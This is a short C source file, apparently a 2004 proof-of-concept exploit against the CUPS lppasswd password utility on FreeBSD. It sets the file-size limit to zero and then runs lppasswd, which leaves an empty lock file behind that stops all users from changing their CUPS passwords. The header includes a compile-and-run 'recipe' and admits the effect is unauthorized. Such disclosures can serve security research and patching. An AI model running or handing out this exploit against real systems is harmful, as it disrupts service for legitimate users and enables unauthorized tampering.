/*
 * evil.c
 * 2004.12.11
 * Bartlomiej Sieka
 *
 * This program executes the lpasswd(1) password changing utility
 * in way that prevents its further use, i.e. after this program
 * has been executed, all users on the system will be unable to change
 * their CUPS passwords. This is not a documented feature of lppasswd(1)
 * and is certainly unauthorized.
 *
 * This program has been tested with lppasswd(1) versions 1.1.19 and
 * 1.1.22 on FreeBSD 5.2.
 *
 * The recipe:
 * gcc -o evil evil.c
 * ./evil
 * Type in passwords as requested, and voila! This will create an empty
 * file /usr/local/etc/cups/passwd.new. The existence of this file makes
 * lppasswd(1) quit before changing users password with message
 * "lppasswd: Password file busy!".
 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
extern char **environ;

int main(int argc, char **argv){

  char *cmd = "/usr/local/bin/lppasswd";
  char *args[] = { "/usr/local/bin/lppasswd", 0x00 };

  /* set the file size limit to 0 */
  struct rlimit rl;
  rl.rlim_cur = 0;
  rl.rlim_max = 0;
  setrlimit(RLIMIT_FSIZE, &rl);

  /* execute the poor victim */
  execve(cmd, args, environ);
}

